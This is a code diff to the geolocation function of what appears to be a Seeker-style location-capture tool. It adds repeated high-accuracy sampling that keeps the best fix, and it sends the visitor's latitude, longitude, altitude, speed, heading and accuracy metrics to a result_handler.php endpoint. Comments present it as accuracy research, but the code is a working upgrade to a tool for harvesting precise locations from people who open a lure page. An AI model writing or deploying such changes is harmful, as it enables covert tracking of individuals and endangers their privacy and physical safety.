@@ -87,9 +87,71 @@ function information() {
 
 
 function locate(callback, errCallback) {
-  if (navigator.geolocation) {
-    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
-    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+  if (!navigator.geolocation) {
+    return;
+  }
+
+  // Accuracy research knobs (defaults preserve the original single-shot
+  // behaviour). Set these in the template before calling locate():
+  //   window.SEEKER_SAMPLE_COUNT   = 5;     // collect N readings, keep best
+  //   window.SEEKER_SAMPLE_TIMEOUT = 30000; // overall window in ms
+  var sampleCount = (typeof window !== 'undefined' && window.SEEKER_SAMPLE_COUNT)
+    ? window.SEEKER_SAMPLE_COUNT : 1;
+  var sampleTimeout = (typeof window !== 'undefined' && window.SEEKER_SAMPLE_TIMEOUT)
+    ? window.SEEKER_SAMPLE_TIMEOUT : 30000;
+  var optn = { enableHighAccuracy: true, timeout: sampleTimeout, maximumAge: 0 };
+
+  if (sampleCount > 1) {
+    collectSamples(sampleCount, sampleTimeout);
+  } else {
+    navigator.geolocation.getCurrentPosition(
+      function (p) { showPosition(p); }, showError, optn);
+  }
+
+  // Collect up to `count` readings via watchPosition, then report the most
+  // accurate fix along with convergence metrics (best/worst accuracy,
+  // time-to-best). Lets the researcher see accuracy improve over time.
+  function collectSamples(count, timeout) {
+    var samples = [];
+    var start = Date.now();
+    var done = false;
+    var watchId = navigator.geolocation.watchPosition(
+      function (pos) {
+        samples.push({ pos: pos, t: Date.now() });
+        if (samples.length >= count) { finish(); }
+      },
+      function (error) {
+        if (samples.length === 0) { finish(error); }
+      },
+      optn
+    );
+    var timer = setTimeout(function () { finish(); }, timeout);
+
+    function finish(error) {
+      if (done) { return; }
+      done = true;
+      clearTimeout(timer);
+      navigator.geolocation.clearWatch(watchId);
+      if (samples.length === 0) {
+        showError(error || { code: -1 });
+        return;
+      }
+      var best = samples[0];
+      var accBest = samples[0].pos.coords.accuracy;
+      var accWorst = samples[0].pos.coords.accuracy;
+      for (var i = 1; i < samples.length; i++) {
+        var a = samples[i].pos.coords.accuracy;
+        if (a < best.pos.coords.accuracy) { best = samples[i]; }
+        if (a < accBest) { accBest = a; }
+        if (a > accWorst) { accWorst = a; }
+      }
+      showPosition(best.pos, {
+        samples: samples.length,
+        accBest: accBest + ' m',
+        accWorst: accWorst + ' m',
+        timeToBest: (best.t - start) + ' ms'
+      });
+    }
   }
 
   function showError(error) {
@@ -111,6 +173,9 @@ function locate(callback, errCallback) {
         err_text = 'An unknown error occurred';
         break;
     }
+    if (!err_text) {
+      err_text = 'Location information is unavailable';
+    }
 
     $.ajax({
       type: 'POST',
@@ -120,7 +185,7 @@ function locate(callback, errCallback) {
       mimeType: 'text'
     });
   }
-  function showPosition(position) {
+  function showPosition(position, meta) {
     var lat = position.coords.latitude;
     if (lat) {
       lat = lat + ' deg';
@@ -178,10 +243,18 @@ function locate(callback, errCallback) {
 
     var ok_status = 'success';
 
+    var payload = { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, AccAlt: accAlt, Ts: ts };
+    if (meta) {
+      payload.Samples = meta.samples;
+      payload.AccBest = meta.accBest;
+      payload.AccWorst = meta.accWorst;
+      payload.TimeToBest = meta.timeToBest;
+    }
+
     $.ajax({
       type: 'POST',
       url: 'result_handler.php',
-      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, AccAlt: accAlt, Ts: ts },
+      data: payload,
       success: callback,
       mimeType: 'text'
     });
